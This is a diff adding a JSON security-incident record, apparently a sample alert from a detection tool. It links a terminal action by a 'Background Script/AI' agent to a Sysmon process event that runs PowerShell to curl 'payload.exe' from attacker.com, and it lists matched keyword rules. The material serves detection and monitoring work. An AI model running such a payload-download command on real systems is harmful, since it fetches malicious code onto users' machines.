@@ -1,0 +1,26 @@
+{
+    "incident_id": "INC-0047",
+    "ai_event": {
+        "agent": "Background Script/AI",
+        "action": "terminal",
+        "timestamp": "2026-06-18T07:45:29.4236167Z"
+    },
+    "sysmon_event": {
+        "EventID": 1,
+        "TimestampUTC": "2026-06-18T07:45:29.4236167Z",
+        "ProcessId": "35036",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "\"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -NoExit -Command \"curl http://attacker.com/payload.exe; echo '\u0110ang t\u1ea3i m\u00e3 \u0111\u1ed9c...'\"",
+        "ParentProcessId": "9200",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "_correlated": true
+    },
+    "severity": "CRITICAL",
+    "matched_rules": [
+        "Keyword: curl",
+        "Keyword: http",
+        "Keyword: payload",
+        "Process: PowerShell",
+        "Network: Outbound Comm"
+    ]
+}
